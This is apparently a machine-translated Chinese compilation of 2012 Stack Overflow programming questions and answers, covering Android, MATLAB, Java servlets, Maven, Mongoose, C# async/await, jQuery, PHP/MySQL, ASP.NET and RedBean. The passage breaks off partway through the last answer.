SDK Manager 让我可以选择下载任何 Android 版本的源代码。我可以`sources`在`android-sdk`.

但是，对于 API 14 之前的版本，我找不到该选项来下载！

有谁知道怎么下载？或者为什么我不能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T12:34:13.167

对于 3.x 版本的 Android，未发布源代码。所以对于这些版本，我可以理解为什么没有这样的选项。对于 2.x 版本，在我的情况下也没有这样的选项。

对于 2.x 版本，您可以使用称为 Android 源的特殊插件。[您可以在此处](https://code.google.com/p/adt-addons/)找到说明。

第二种选择是下载 Android 资源。在 android-ver.jar 的属性中，您可以设置源的位置。

# image - 在 Matlab GUI 中打印图像

> ID：13429277
> 
> 赞同：0
> 
> 时间：2012-11-17T09:21:40.830
> 
> 标签：image, matlab, printing

如何在 Matlab GUI 中从打印机打印图像？使用下面的代码时出现错误。请帮我。

```
smapleimage = imread('image.png');
printdlg(handles.smapleimage) 
```

...

```
Undefined function or variable 'smapleimage'. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T12:04:31.317

那是因为 smapleimage 是数字，而 printdlg 只接受图形句柄。

**1）** 一个人可以先创建一个matlab图形（虽然它可能是隐藏的）

```
smapleimage = imread('image.png');
image(smapleimage)
printdlg 
```

**2）** ..或调用一些系统工具，从命令行打印，如下所示：

```
system('mspaint /pt image.png'); 
```

此处讨论了其他命令行打印选项：[1](https://superuser.com/questions/477895/printing-from-windows-7-command-line)、[2](https://stackoverflow.com/questions/11321919/command-line-photo-printing-in-windows-7)、[3](https://stackoverflow.com/questions/2301101/command-line-tool-for-print-picture)。

# java - 在jsp中将整数值传递给cookie

> ID：13429279
> 
> 赞同：0
> 
> 时间：2012-11-17T09:21:47.660
> 
> 标签：java, servlets

我的 java servlet 代码中有一个整数值，该值是从数据库中检索的，我需要将该值添加到 cookie 中。

```
int k=rs.getInt(3);
Cookie c1= new Cookie("access", k); 
```

但是这一行抛出一个错误说：

```
Cookie c1= new Cookie("access", k);
             ^
required: String,String
found: String,int
reason: actual argument int cannot be converted to String by method invocation
conversion
1 error 
```

我理解错误，但我该如何将 int 值传递给 cookie。我是 servlet 的新手。您的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:31:09.920

如果您看到[Cookie](http://docs.oracle.com/javaee/1.4/api/javax/servlet/http/Cookie.html#Cookie%28java.lang.String,%20java.lang.String%29)的文档，它唯一的构造函数将两个参数都作为`String`. 因此，您需要将`integer`值转换为`String`.

你可以使用`String.valueOf(int)`方法： -

```
int k=rs.getInt(3);
Cookie c1 = new Cookie("access", String.valueOf(k)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:23:31.483

试试这个：

```
Cookie c1= new Cookie("access", "" + k); 
```

# spring - 包含 Spring Data 时出现 Spring STS 错误

> ID：13429280
> 
> 赞同：0
> 
> 时间：2012-11-17T09:21:51.127
> 
> 标签：spring, spring-mvc, spring-data

我是 Java 和 Spring MVC 的新手。我正在尝试通过在 pom.xml 中使用以下代码来包含 spring Mongodb 数据。

```
 <dependency>
 <groupId>org.springframework.data</groupId>
 <artifactId>spring-data-mongodb</artifactId>
 <version>1.1.0.BUILD-SNAPSHOT</version>
</dependency> 
```

但我得到以下错误：

/ ***** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ***** /

cvc-complex-type.2.4.a：发现以元素“依赖”开头的无效内容。'{"http://maven.apache.org/POM/4.0.0":parent, "http://maven.apache.org/POM/4.0.0":description, "http://maven" 之一.apache.org/POM/4.0.0”：网址，“http://maven.apache.org/POM/4.0.0”：先决条件，“http://maven.apache.org/POM/4.0.0 ":issueManagement, "http://maven.apache.org/POM/4.0.0":ciManagement, "http://maven.apache.org/POM/4.0.0":inceptionYear, "http://maven .apache.org/POM/4.0.0":mailingLists, "http://maven.apache.org/POM/4.0.0":developers, "http://maven.apache.org/POM/4.0.0 ":contributors, "http://maven.apache.org/POM/4.0.0":licenses, "http://maven.apache.org/POM/4.0.0":scm, "http://maven .apache.org/POM/4.0.0"：组织，

/ ***** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** ** *** **** /

这是我的 pom.xml ：

/################################################# ###########################/ org.springframework spring-context ${org.springframework-version} commons-logging commons-logging org .springframework spring-webmvc ${org.springframework-version}

```
 <!-- AspectJ -->
    <dependency>
        <groupId>org.aspectj</groupId>
        <artifactId>aspectjrt</artifactId>
        <version>${org.aspectj-version}</version>
    </dependency>   

    <!-- Logging -->
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-api</artifactId>
        <version>${org.slf4j-version}</version>
    </dependency>
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>jcl-over-slf4j</artifactId>
        <version>${org.slf4j-version}</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>org.slf4j</groupId>
        <artifactId>slf4j-log4j12</artifactId>
        <version>${org.slf4j-version}</version>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>log4j</groupId>
        <artifactId>log4j</artifactId>
        <version>1.2.15</version>
        <exclusions>
            <exclusion>
                <groupId>javax.mail</groupId>
                <artifactId>mail</artifactId>
            </exclusion>
            <exclusion>
                <groupId>javax.jms</groupId>
                <artifactId>jms</artifactId>
            </exclusion>
            <exclusion>
                <groupId>com.sun.jdmk</groupId>
                <artifactId>jmxtools</artifactId>
            </exclusion>
            <exclusion>
                <groupId>com.sun.jmx</groupId>
                <artifactId>jmxri</artifactId>
            </exclusion>
        </exclusions>
        <scope>runtime</scope>
    </dependency>

    <!-- @Inject -->
    <dependency>
        <groupId>javax.inject</groupId>
        <artifactId>javax.inject</artifactId>
        <version>1</version>
    </dependency>

    <!-- Servlet -->
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>servlet-api</artifactId>
        <version>2.5</version>
        <scope>provided</scope>
    </dependency>
    <dependency>
        <groupId>javax.servlet.jsp</groupId>
        <artifactId>jsp-api</artifactId>
        <version>2.1</version>
        <scope>provided</scope>
    </dependency>
    <dependency>
        <groupId>javax.servlet</groupId>
        <artifactId>jstl</artifactId>
        <version>1.2</version>
    </dependency>

    <!-- Test -->
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.7</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.mongodb</groupId>
        <artifactId>mongo-java-driver</artifactId>
        <version>2.9.3</version>
    </dependency>
    <dependency>
        <groupId>org.springframework.data</groupId>
        <artifactId>spring-data-mongodb</artifactId>
        <version>1.1.0.BUILD-SNAPSHOT</version>
    </dependency>
    <dependency>
        <groupId>cglib</groupId>
        <artifactId>cglib</artifactId>
        <version>2.2.2</version>
    </dependency>

</dependencies> 
```

/################################################# ###########################/

有人可以指导我做错了什么以及如何纠正它。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:33:55.233

该错误表明您`pom.xml`有错误-它没有遵循 xml 架构。

没有看到整个文件，很难说出确切的原因，但我猜你错过了开始`<dependencies>`标签。

[这是来自maven 站点](http://maven.apache.org/guides/introduction/introduction-to-the-pom.html#Minimal_POM)的示例。

```
<project>
  ...
  <properties>
    <mavenVersion>2.1</mavenVersion>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.apache.maven</groupId>
      <artifactId>maven-artifact</artifactId>
      <version>${mavenVersion}</version>
    </dependency>
    <dependency>
      <groupId>org.apache.maven</groupId>
      <artifactId>maven-project</artifactId>
      <version>${mavenVersion}</version>
    </dependency>
  </dependencies>
  ...
</project> 
```

# javascript - Mongoose 子文档：无法调用未定义的方法调用

> ID：13429293
> 
> 赞同：1
> 
> 时间：2012-11-17T09:23:48.497
> 
> 标签：javascript, mongodb, reference, mongoose, document

```
TypeError: Cannot call method 'call' of undefined
    at Array.MongooseArray._cast (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/mongoose/lib/types/array.js:78:15)
    at Object.map (native)
    at Array.MongooseArray.push (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/mongoose/lib/types/array.js:187:23)
    at module.exports (/Users/bodo/Documents/Repositories/EnabreNode/accounts/routes/me.js:29:27)
    at callbacks (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/express/lib/router/index.js:160:37)
    at Promise.module.exports (/Users/bodo/Documents/Repositories/EnabreNode/middleware/load_user.js:15:13)
    at Promise.addBack (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/mongoose/lib/promise.js:128:8)
    at Promise.EventEmitter.emit (events.js:96:17)
    at Promise.emit (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/mongoose/lib/promise.js:66:38)
    at Promise.complete (/Users/bodo/Documents/Repositories/EnabreNode/node_modules/mongoose/lib/promise.js:77:20) 
```

我实际上想构建一个非常简单的架构：

```
{
    username: "bodo",
    email: "info@example.com",
    contacts: [{ 
        user: { username: "john", email: "john@google.com" }, 
        messages: [
            { 
                sender: { username: "bodo", email: "info@example.com" },
                receiver: { username: "john", email: "john@google.com" },
                body: "How are you these days?"
            },
            { 
                sender: { username: "john", email: "john@google.com" },                                       
                receiver: { username: "bodo", email: "info@example.com" },
                body: "I am totally fine?"
            } 
        ]
    }]
}; 
```

联系人属性包含一个联系人子文档，其中包含实际联系人的用户对象（作为参考）以及稍后的一些元数据，如 hasAcceptedContactRequest、contactSince 等。此外，我还保存来自聊天的消息子文档。这些消息子文档包含消息作为正文属性以及谁发送或接收了它。发送方和接收方再次引用了可以填充的完整用户对象。

理论上这么多。我现在已经创建了这些模式：

**用户模式**

```
var Mongoose = require('mongoose');
var ContactSchema = require('./contact');

var UserSchema = new Mongoose.Schema({

    username: { 
        type: String, 
        index: { unique: true, sparse: true }, 
        required: true, lowercase: true, trim: true
    },

    email: {
        type: String,
        index: { unique: true, sparse: true }, 
        required: true, lowercase: true, trim: true
    },

    contacts: [ContactSchema]

});

module.exports = Mongoose.model('User', UserSchema, 'Users'); 
```

**ContactSchema**

```
var Mongoose = require('mongoose');
var MessageSchema = require('./message');

var ContactSchema = new Mongoose.Schema({

    user: {
        ref: "User",
        type: Mongoose.Schema.Types.ObjectId
    },

    messages: [MessageSchema]

});

module.exports = ContactSchema; 
```

**消息模式**

```
var MessageSchema = new Mongoose.Schema({

    body: {
        type: String
    },

    sender: {
        ref: "User",
        type: Mongoose.Schema.Types.ObjectId
    },

    receiver: {
        ref: "User",
        type: Mongoose.Schema.Types.ObjectId
    }

});

module.exports = ContactSchema; 
```

**那是路线**

```
app.put('/me', loadUser, function(req, res, next) {
    var user = req.user;
    var body = req.body;

    if (body.contacts) {
        body.contacts.forEach(function(contact) {
            user.contacts.push({ user: contact });
        });
    }

    console.log(req.user);

    user.save(function(err, user) {
        if (err) return next(err);
        res.send(200);
    });
}); 
```

解决方案：正如johnyHK所说，使用node的模块系统存在问题。我不小心将模式导出为模型。您现在可以看到上面更正后的示例。所以他们应该工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T13:37:30.403

假设您的模式定义的顺序在您的代码中是相同的，您需要对它们重新排序，以便在使用时完全定义引用的模式。

所以那将是：

1.  `MessageSchema`
2.  `ContactSchema`
3.  `UserSchema`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:33:23.660

试试这个：

```
 user : { type: Schema.ObjectId, ref: 'User', index: true } 
```

# c# - 等待/异步与线程有什么不同？

> ID：13429294
> 
> 赞同：23
> 
> 时间：2012-11-17T09:24:00.213
> 
> 标签：c#, .net, multithreading, async-await

我正在尝试熟悉 c# 的新 await/async 关键字，但我发现了几个我不太了解的方面。

1.  让我们从竞争条件开始：

    ```
    Stream s=...
    ...
    for(int i=0;i<100;i++)
    {
        s.WriteAsync(new byte[]{i},0,1);
    } 
    ```

    这会一直按预期工作吗（例如写入文件 12345 ..... 而不是 13254 或其他东西）？

    第二件事是，如果 async 函数不包含 await 运算符，则它会同步执行。而且，根据微软文档，异步函数总是在调用者线程中执行（与 BeginInvoke 相比）。这让我想到了接下来的 3 个问题：

2.  在发布给调用者函数之前，执行了多少异步函数？

    ```
    async void MyAsyncFunction()
    {
        Operation1();
        Operation2();
        Operation3();
        ....
        Stream s=...;
        await s.WriteAsync(....);
    } 
    ```

    在我读过的关于 await/async 的文章中，据说没有 await 运算符的 async 函数是按顺序执行的，而带有 async/await 的函数将立即返回。但它一直困扰着我，它`MyAsyncFunction`可能总是在执行 Operation1...Operation3 之前在它击中时释放`await s.WriteAsync`。

3.  如果我`Thread.Sleep`在这样的异步函数中使用怎么办：

    ```
    async void DoStuff()
    {
        Stream s=...;
        ...
        await s.WriteAsync(....);
        Thread.Sleep(10000);
        ....
    } 
    ```

    Thread.Sleep 会阻塞执行它的整个线程还是仅仅阻塞异步函数？

4.  如果我`semaphore.Wait()`在其中一个异步函数中使用，它会期望信号量被另一个异步函数释放。这会像线程一样运行，还是会导致死锁？

5.  `await`在异步函数之外不起作用。为什么？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-11-17T14:03:54.863

我建议你阅读我的[`async`介绍](http://blog.stephencleary.com/2012/02/async-and-await.html)。

> 这会一直按预期工作吗（例如写入文件 12345 ..... 而不是 13254 或其他东西）？

不，您需要`await`调用`WriteAsync`.

> 在发布给调用者函数之前，执行了多少异步函数？

直到它`await`是一个尚未完成的操作。

> Thread.Sleep 会阻塞执行它的整个线程还是仅仅阻塞异步函数？

`Thread.Sleep`- 和所有其他阻塞方法 - 将阻塞`async`方法和正在执行它的线程。

作为一般规则，不要在方法中使用*任何*阻塞方法`async`。

> 如果我在其中一个异步函数中使用 semaphore.Wait() 会怎样，它会期望信号量被另一个异步函数释放。这会像线程一样运行，还是会导致死锁？

这完全取决于您的上下文。`Wait`是一个阻塞方法，所以如果“其他”`async`方法需要被阻塞方法持有的上下文，那么你就会死锁。

注意`SemaphoreSlim`是`async`- 友好的；您可以使用`WaitAsync`而不是`Wait`.

> await 在异步函数之外不起作用。为什么？

因为`async`关键字启用`await`关键字。这样做是为了尽量减少新关键字对 C# 语言的影响和代码的可读性。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-11-17T10:38:40.117

[您可以在Eric Lippert](http://blogs.msdn.com/b/ericlippert/archive/2010/10/29/asynchronous-programming-in-c-5-0-part-two-whence-await.aspx)`await`的以下帖子中找到有关 operator 的问题的答案，他说：

> “await”操作符……并不意味着“这个方法现在阻塞当前线程，直到异步操作返回”。那将使异步操作回到同步操作，这正是我们试图避免的。相反，它的意思与此相反；它的意思是“如果我们正在等待的任务还没有完成，那么注册这个方法的其余部分作为该任务的延续，然后立即返回给你的调用者；任务完成后将调用延续。——埃里克·利珀特

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:36:13.280

简而言之，答案似乎是“非常”。虽然以下内容可能无法回答您的所有问题，但我认为它适用于足够普遍的用例。想想你的 Stream 而不是他们所指的网络 IO。

> 在网络 IO 重叠的情况下，将使用 IO 完成端口，回调由硬件中断触发。
> 
> 这意味着当我们“等待”完成时，不会消耗线程。[...]
> 
> 可以在 1 个线程上完成所有操作。[...] 但是，它将取决于平台、“等待者”实现和正在使用的同步上下文。

[http://social.msdn.microsoft.com/Forums/en-US/async/thread/a46c8a54-f8d4-4fa9-8746-64d6a3a7540d/](http://social.msdn.microsoft.com/Forums/en-US/async/thread/a46c8a54-f8d4-4fa9-8746-64d6a3a7540d/)

# java - 如何使用 jdbc 连接到 pgAdmin

> ID：13429298
> 
> 赞同：0
> 
> 时间：2012-11-17T09:24:22.163
> 
> 标签：java, jdbc, postgresql-9.1

我想制作一个java程序来访问我制作的数据库项目是pgAdmin 3 postgresql。那么如何开始呢？我正在使用窗户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:34:20.243

您需要`PostgreSQL`使用`JDBC`驱动程序直接连接到 。`PgAdmin`只是一个连接到的管理工具`PostgreSQL`。有关更多详细信息，请参阅[使用 JDBC 驱动程序连接到 PostgreSQL](http://www.mkyong.com/jdbc/how-do-connect-to-postgresql-with-jdbc-driver-java/)。

# jquery - 动态创建的 iframe 无法访问

> ID：13429299
> 
> 赞同：1
> 
> 时间：2012-11-17T09:24:38.137
> 
> 标签：jquery, iframe

我正在实现一个使用 iframe 的 ajax 图片上传功能。我搜索了 SO 并发现了类似的问题，但我已经尝试过了，但它们对我没有用。我的 ajax 图片上传工作如下：

*   用户点击“添加图片”按钮，动态创建一个新的对话框`$('#imgdialog')`。此对话框只是一个 div，其中包含一个动态创建的表单`$('#imgform')`和一个 iframe `$('#upload_target')`，.
*   该表单允许用户通过 ajax uplaod 选择*应*显示在 iframe 中的文件。

但这不会发生。我正在关注本教程：[http ://www.ajaxf1.com/tutorial/ajax-file-upload-tutorial.html](http://www.ajaxf1.com/tutorial/ajax-file-upload-tutorial.html)

我的实现与教程中的实现之间的主要区别在于，在我的实现中，表单和 iframe 在页面加载时并不存在，它们是在用户单击按钮时动态创建的。

我知道我的 PHP 代码运行良好，因为当我使用 FireBug 时，我可以看到所需的 POST 和 RESPONSE。但是 Iframe 没有被填充，尽管在 FireBug 中我可以看到它存在于 HTML 中，除了它是空的。

创建动态表单和 iframe 的代码是：

```
 imgform = document.createElement('form');
    imgform.id = 'imgform';
    imgform.method='post';
    imgform.enctype='multipart/form-data';
    imgform.action ='upload_1.php';
    imgform.target = 'upload_target';
    imgform.onsubmit='showUploadedItem();';
    $('#imgform').append("Select image:<br /><input type='file' id='imgfile' />");
    $('#imgdialog').append("<iframe id='upload_target' name='upload_target' style='border:1px solid gray;' src='#'></iframe>");

    $('#upload_target').bind('load', function() { // doesn't work with .live either
         $(this).contents().find("body").html('greetings from the iframe !');
         alert("loaded");
    }); 
```

在`$('#imgform')`'s, onSubmit 函数中，我还包括以下行：

```
 if($('#upload_target').length > 0){ alert("it's there"); } else {alert ("not there"); } 
```

我得到了“不在那里”。

如何访问 iframe？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:35:13.433

```
$(document.body).on('DOMNodeInserted', 'iframe', function(e) {
    console.log('inserted', e);
});

var frame = document.createElement('iframe');
$(document.body).append(frame); 
```

或定义函数并直接从 iframe 内容中调用它

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:14:53.950

问题是否可能是您在 iframe 存在之前设置响应目标？我已经将这些事件的侦听器绑定到 iframe（我认为甚至是动态创建的）。不过它有些尴尬——可能需要一个非常小的 jQuery 插件，这取决于你想要什么样的加载事件。

另外，动态创建的#imgdialog div 在哪里？不在此处的代码中。也许您打算改为提供 imgdialog 的 id。

# php - 带有单选按钮的表单提交到 mysql

> ID：13429301
> 
> 赞同：0
> 
> 时间：2012-11-17T09:24:47.787
> 
> 标签：php, javascript, jquery, mysql, ajax

我是 php 和 mysql 的初学者，在一种情况下我需要你的帮助。我有一个带有单选按钮的表单，实际上是一个星级评分系统，我想通过 ajax 调用将表单提交到 mysql 数据库。我不知道如何进行 ajax 调用和用于插入 mysql 的 php。请帮忙！

我的代码是：

```
<div class="Clear">&nbsp;</div>
<form id="form1">

        Question 1:bla bla bla

   <input class="star required" type="radio" name="Question 1" value="1"/>
    <input class="star" type="radio" name="Question 1" value="2"/>
    <input class="star" type="radio" name="Question 1" value="3"/>
    <input class="star" type="radio" name="Question 1" value="4"/>
    <input class="star" type="radio" name="Question 1" value="5"/>
   </div>
   <br/>
   <div class="Clear">

        Question 2:bla bla bla

    <input class="star required" type="radio" name="Question 2" value="1"/>
    <input class="star" type="radio" name="Question 2" value="2"/>
    <input class="star" type="radio" name="Question 2" value="3"/>
    <input class="star" type="radio" name="Question 2" value="4"/>
    <input class="star" type="radio" name="Question 2" value="5"/>
   </div>
   <br/>
   <div class="Clear">

        Question 3:bla bla bla

    <input class="star required" type="radio" name="Question 3" value="1"/>
    <input class="star" type="radio" name="Question 3" value="2"/>
    <input class="star" type="radio" name="Question 3" value="3"/>
    <input class="star" type="radio" name="Question 3" value="4"/>
    <input class="star" type="radio" name="Question 3" value="5"/>
   </div>
 <br>
   <div class="Clear">

        Question 4:bla bla bla

    <input class="star required" type="radio" name="Question 4" value="1" />
    <input class="star" type="radio" name="Question 4" value="2" />
    <input class="star" type="radio" name="Question 4" value="3" />
    <input class="star" type="radio" name="Question 4" value="4" />
    <input class="star" type="radio" name="Question 4" value="5" />
   </div>
   <br/>
   <div class="Clear">

        Question 5:bla bla bla

    <input class="star required" type="radio" name="Question 5" value="1"/>
    <input class="star" type="radio" name="Question 5" value="2"/>
    <input class="star" type="radio" name="Question 5" value="3"/>
    <input class="star" type="radio" name="Question 5" value="4"/>
    <input class="star" type="radio" name="Question 5" value="5"/>
   </div>
   <br/>
   <div class="Clear">

        Question 6:bla bla bla

    <input class="star required" type="radio" name="Question 6" value="1" />
    <input class="star" type="radio" name="Question 6" value="2" />
    <input class="star" type="radio" name="Question 6" value="3" />
    <input class="star" type="radio" name="Question 6" value="4" />
    <input class="star" type="radio" name="Question 6" value="5" />
   </div>

   <input type="submit" value="Submit scores!" />  </td>

</form>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:33:36.057

使用序列化函数获取所有 ans 并传递给 ans_file.php。

```
$('form').submit(function() {
 var ans=$(this).serialize();
  $.ajax({
  type: "POST",
   url: "ans_file.php",
  data:ans
 }).done(function( msg ) {
 alert( "Data Saved: " + msg );
 });
 return false;
}); 
```

我有一些问题：我做了这个 php 并没有插入任何东西，如果我遗漏了什么，你能告诉我吗？谢谢！

```
<?php
$mysql_hostname = "localhost";
$mysql_user = "root";
$mysql_password = "";
$mysql_database = "stars";
$prefix = "";
$bd = mysql_connect($mysql_hostname, $mysql_user, $mysql_password) or die("Opps some thing went wrong");
mysql_select_db($mysql_database, $bd) or die("Opps some thing went wrong");

if($_SERVER["REQUEST_METHOD"] == "POST")
{
$question1 = mysql_real_escape_string($_POST['question1']);
$question2 = mysql_real_escape_string($_POST['question2']);
$question3 = mysql_real_escape_string($_POST['question3']);
$question4 = mysql_real_escape_string($_POST['question4']);
$question5 = mysql_real_escape_string($_POST['question5']);
$question6 = mysql_real_escape_string($_POST['question6']);
mysql_query("INSERT INTO table (answers) VALUES ('$question1','$question2','$question3','$question4','$question5','$question6')");
echo "<h1>Thank You !</h1>";
?> 
```

# asp.net - “即时”编译 aspx 页面

> ID：13429302
> 
> 赞同：1
> 
> 时间：2012-11-17T09:24:52.740
> 
> 标签：asp.net

我正在尝试在运行时构建一个 aspx 页面（通过另一个最终重定向到新页面的 aspx 页面）。据我了解，aspx 页面必须在用户查看它们之前进行预编译。也就是说，aspx页面必须编译成/bin文件夹下的DLL。

在我将用户重定向到页面之前，是否可以告诉 IIS 或通过 VB.NET 代码对其进行排序以编译页面？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-29T02:18:58.340

您可以使用[VirtualPathProvider 类](http://msdn.microsoft.com/en-us/library/system.web.hosting.virtualpathprovider.aspx)从数据库加载页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:02:02.050

基本上你需要的是动态呈现页面的内容。您可以通过将控件（HTML 或 Server Ones）添加到控件集合（例如占位符服务器元素）来在服务器端动态创建页面内容。

例如，您可以使用以下标记创建页面：

```
 <%@ Page Language="C#" AutoEventWireup="true" CodeBehind="TestPage.aspx.cs" Inherits="StackOverflowWebApp.TestPage" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server" EnablePartialRendering="true" />

    <asp:PlaceHolder runat="server" ID="ContentPlaceHolder"></asp:PlaceHolder>

    </form>
</body>
</html> 
```

然后在类后面的代码中，我们可以添加控件来渲染，这是从数据库中动态读取信息所必需的。

```
 using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;

namespace StackOverflowWebApp
{
    public partial class TestPage : Page
    {
        #region Methods

        protected override void CreateChildControls()
        {
            base.CreateChildControls();

            // HERE get configuration from database.

            // HERE create content of the page dynamically.

            // Add reference to css file.
            HtmlLink link = new HtmlLink { Href = "~/Styles/styles.css" };
            link.Attributes.Add("type", "text/css");
            link.Attributes.Add("rel", "stylesheet");
            this.Page.Header.Controls.Add(link);

            // Add inline styles.
            HtmlGenericControl inlineStyle = new HtmlGenericControl("style");
            inlineStyle.InnerText = "hr {color:sienna;} p {margin-left:20px;}";
            this.Page.Header.Controls.Add(inlineStyle);

            // Add div with css class and styles.
            HtmlGenericControl div = new HtmlGenericControl("div");
            this.ContentPlaceHolder.Controls.Add(div);
            div.Attributes.Add("class", "SomeCssClassName");
            div.Attributes.CssStyle.Add(HtmlTextWriterStyle.ZIndex, "1000");

            TextBox textBox = new TextBox { ID = "TestTextBox" };
            div.Controls.Add(textBox);

            // and etc
        }

        #endregion
    }
} 
```

注意：此示例可以作为创建动态页面的起点，其内容取决于数据库或配置中指定的值。

# jquery - 如何使用 jQuery 删除 div 中的一行文本？

> ID：13429303
> 
> 赞同：0
> 
> 时间：2012-11-17T09:24:53.487
> 
> 标签：jquery

在下面的代码中，我试图找出一种仅删除单词的方法`Welcome!`。使用 jQuery 执行此操作的最有效方法是什么？

```
<div>
  Welcome!
  <div class="lorem">
    <p>blah blah blah</p>
  </div>
  <ul class="list">
    <li>blah blah</li>
    <li>blah blah</li>
  </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:30:05.773

如果它始终是第一个节点，您可以这样做：

```
$("div").first().contents().first().remove(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:29:42.417

试试这个 ：

```
$(function(){
var x = $('div:eq(0)').html().replace('Welcome!','');
$('div:eq(0)').html(x);
}) 
```

[http://jsfiddle.net/rbgBf/1/](http://jsfiddle.net/rbgBf/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:33:17.420

它可能不是最漂亮的，但这会起作用：

```
var parent = $(".lorem").parent();
​parent.html(parent.children());​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

一个工作示例：http: [//jsfiddle.net/QsPYB/](http://jsfiddle.net/QsPYB/)

# php - PHP RedBean 存储 bean 如果不存在一个

> ID：13429304
> 
> 赞同：5
> 
> 时间：2012-11-17T09:25:09.190
> 
> 标签：php, mysql, database, orm, redbean

我有点困惑。我在我的直接邮件服务中积极使用 PHP RedBean 作为 ORM，但我遇到了奇怪的情况 - 我有一个具有唯一键约束的表（即，subscriber_id、delivery_id）和两个将数据写入该表的脚本。有插入或更新表的源代码：

```
public static function addOpenPrecedent($nSubscriberId, $nDeliveryId)
{
    $oOpenStatBean = \R::findOrDispense('open_stat', 'delivery_id = :did AND subscriber_id = :sid', array(':did' => $nDeliveryId, ':sid' => $nSubscriberId));

    $oOpenStatBean = array_values($oOpenStatBean);
    if (1 !== count($oOpenStatBean)) {
        throw new ModelOpenStatException(
            "Ошибка при обновлении статистики открытий: пара (delivery_id,
            subscriber_id) не является уникальной: ($nDeliveryId, $nSubscriberId).");
    }

    $oOpenStatBean = $oOpenStatBean[0];
    if (!empty($oOpenStatBean->last_add_dt)) {
        $oOpenStatBean->precedent++;
    } else {
        $oOpenStatBean->delivery_id   = $nDeliveryId;
        $oOpenStatBean->subscriber_id = $nSubscriberId;
    }

    $oOpenStatBean->last_add_dt = time('Y-m-d H:i:s');
    \R::store($oOpenStatBean);
} 
```

它是从两个脚本中调用的。而且我会定期在此表上遇到损坏唯一约束的问题，因为会发生竞争条件。我知道 SQL“插入重复键更新”功能。但是我怎样才能完全使用我的 ORM 获得相同的结果呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-09-01T20:55:31.677

目前，我知道，如果 Redbean 不会发出

```
INSERT ON DUPLICATE KEY UPDATE 
```

正如上面评论中引用的对此的讨论表明 Redbean 的开发人员认为 upsert 是一种会污染 ORM 界面的业务逻辑事物。[话虽这么说，如果根据文档](http://redbeanphp.com/plugins/create_your_own)使用自定义查询编写器或插件来扩展 Redbean，这很可能是可以实现的。我没有尝试过，因为下面的方法很容易实现这种行为，而不会弄乱 ORM 的内部和插件，但是，它确实需要您使用事务和模型以及一些额外的查询。

基本上，在调用 R::store() 之前使用 R::transaction() 或 R::begin() 开始您的事务。然后在您的“FUSE”d 模型中，使用“update”FUSE 方法运行查询，检查重复并检索现有 id，同时锁定必要的行（即 SELECT FOR UPDATE）。如果没有返回 id，你很好，只是让你的常规模型验证（或缺少它）像往常一样继续并返回。如果找到 id，只需将 $this->bean->id 设置为返回值，Redbean 将更新而不是 INSERT。因此，使用这样的模型：

```
class Model_OpenStat extends RedBean_SimpleModel{
  function update(){
     $sql = 'SELECT * FROM `open_stat` WHERE `delivery_id`=? AND 'subscriber_id'=? LIMIT 1 FOR UPDATE';
     $args = array( $this->bean->deliver_id, $this->bean->subscriber_id );
     $dupRow = R::getRow( $sql, $args );
     if( is_array( $dupRow ) && isset( $dupRow['id'] ) ){
        foreach( $this->bean->getProperties() as $property => $value ){
          #set your criteria here for which fields
          #should be from the one in the database and which should come from this copy
          #this version simply takes all unset values in the current and sets them
          #from the one in the database
          if( !isset( $value ) && isset( $dupRow[$property] ) )
            $this->bean->$property = $dupRow[$property];
        }
        $this->bean->id = $dupId['id']; #set id to the duplicates id
     }
     return true;
  }
} 
```

然后，您将像这样修改 R::store() 调用：

```
\R::begin();
\R::store($oOpenStatBean);
\R::commit(); 
```

或者

```
